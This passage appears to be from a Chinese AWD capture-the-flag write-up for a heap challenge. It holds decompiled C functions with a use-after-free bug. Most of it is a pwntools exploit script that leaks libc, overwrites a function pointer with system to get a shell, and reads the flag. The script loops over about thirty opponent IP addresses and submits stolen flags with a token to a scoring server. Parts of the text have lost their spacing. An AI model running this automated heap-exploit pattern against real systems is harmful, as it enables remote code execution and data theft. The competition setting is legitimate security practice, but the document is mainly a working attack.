voidremoveConn(){intn0x10;// [rsp+Ch] [rbp-4h]puts("Connection Number?"); n0x10 =readint();if( (unsignedint)n0x10 <0x10) {if( *((_QWORD *)&connections + n0x10) ) {free(**((void***)&connections + n0x10));free(*((void**)&connections + (unsignedint)n0x10)); }else {puts("No connection exists at this index."); } }else {puts("Invalid connection number. Please enter a valid number."); }}
voideditConn(){ __int64 v0;// rbx __int64 v1;// rbxintnbytes;// [rsp+4h] [rbp-1Ch]intn0x10;// [rsp+Ch] [rbp-14h]puts("Connection Number?"); n0x10 =readint();if( (unsignedint)n0x10 <0x10) {if( *((_QWORD *)&connections + n0x10) ) {printf("New IP?");if(readint() ==1) { v0 = *((_QWORD *)&connections + n0x10); *(_DWORD *)(v0 +8) =inet_addr("New IP?"); }printf("New Port?");if(readint() ==1) { v1 = *((_QWORD *)&connections + n0x10); *(_WORD *)(v1 +12) =htons((uint16_t)"New Port?"); }printf("New Comment?");if(readint() ==1&& **((_QWORD **)&connections + n0x10) ) {printf("New Length?"); nbytes =readint();printf("New Content?");if(read(0, **((void***)&connections + n0x10), nbytes) <=0)perror("read error"); } }else {puts("No connection exists at this index."); } }else {puts("Invalid connection number. Please enter a valid number."); }}
frompwnimport*importrequests#io=process('./pwn')hosts=['10.103.1.4','10.103.2.4','10.103.3.4','10.103.4.4','10.103.5.4','10.103.6.4','10.103.7.4','10.103.8.4','10.103.9.4','10.103.10.4','10.103.11.4','10.103.12.4','10.103.13.4','10.103.14.4','10.103.15.4','10.103.16.4','10.103.17.4','10.103.18.4','10.103.19.4','10.103.20.4','10.103.21.4','10.103.22.4','10.103.23.4','10.103.25.4','10.103.26.4','10.103.27.4','10.103.28.4','10.103.29.4','10.103.30.4']#for i in hosts[:3]+hosts[4:15]+hosts[17:19]+hosts[21:28]:
foriinhosts[17:]:
try: io=remote(f"{i}",9999) libc=ELF('./libc.so.6') io.sendlineafter(b"Please select an option: ",b"4")
# context.log_level='debug'defbug(): gdb.attach(io)defch(Id): io.sendlineafter(b"Please select an option: ",str(Id).encode())defadd(Id,size,payload): ch(1) io.sendlineafter(b"Connection Number?",str(Id).encode()) io.sendlineafter(b"Enter IP address (format: a.b.c.d): ",b"10.101.10.10") io.sendlineafter(b"Enter port number (default is 8080): ",b"800") io.sendlineafter(b"Add comment?",b"1") io.sendlineafter(b"Length?",str(size).encode()) io.sendafter(b"Content?",payload)deffree(Id): ch(2) io.sendlineafter(b"Connection Number?",str(Id).encode())defshow(): ch(4)defedit(Id,payload): ch(3) io.sendlineafter(b"Connection Number?",str(Id).encode()) io.sendafter(b"New IP?",b"0n") io.sendlineafter(b"New Port?",b"0") io.sendlineafter(b"New Comment?",b"1") io.sendlineafter(b"New Length?",str(len(payload)).encode()) io.sendafter(b"New Content?",payload) add(0,0x10,b'a'*0x10) add(1,0x10,b'a'*0x10) free(1) free(0) add(0,0x500,b'a'*0x10) add(1,0x20,b'a') add(2,0x500,b'a'*0x10) add(3,0x200,b'a'*0x50) free(0) free(2) add(0,0x500,b'0')#bug() show() io.recvuntil(b"Comment: 0") t=u64(io.recv(6).ljust(8,b'x00'))print(hex(t)) tmp =hex(t)[2:] tmp = tmp[2:]+tmp[:2] t =int(tmp,16)-0x1ecb43print(hex(t)) fhook=0x405018 system=t+libc.sym.system add(4,0x40,b'a') add(5,0x40,b'a') edit(5,b'0'*0x10) add(6,0x20,b'a'*8) add(7,0x20,b'b'*8) free(7) edit(6,p64(0)*5+p64(0x21)+p64(0)*3+p64(0x31)+p64(0)*2) free(7) edit(6,p64(0)*5+p64(0x21)+p64(fhook-8)*2) add(8,0x10,b"/bin/shx00"+p64(system)) free(8) io.sendline(b"cat /flag/flag") t=io.recvuntil(b"flag") flag=io.recvuntil(b"}") flag=b"flag"+flag flag=flag.decode() url =b"https://10.10.26.6/api/awd/batch_flag/" headers = {"Content-Type":"application/json"} data = {"token":"87caca98ffb1d59926e65b7fbdc61462","flag":
flag,"pk":"166f8e1b83cd20e2cc1a813383e9d1b6"} res = requests.post(url=url,headers=headers,json=data,verify=False)print(f"nnn----------{i}-{res.text}-{flag}nnnn")exceptExceptionase:
print(f"nnn----------{i}-{e}nnnn") io.close()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]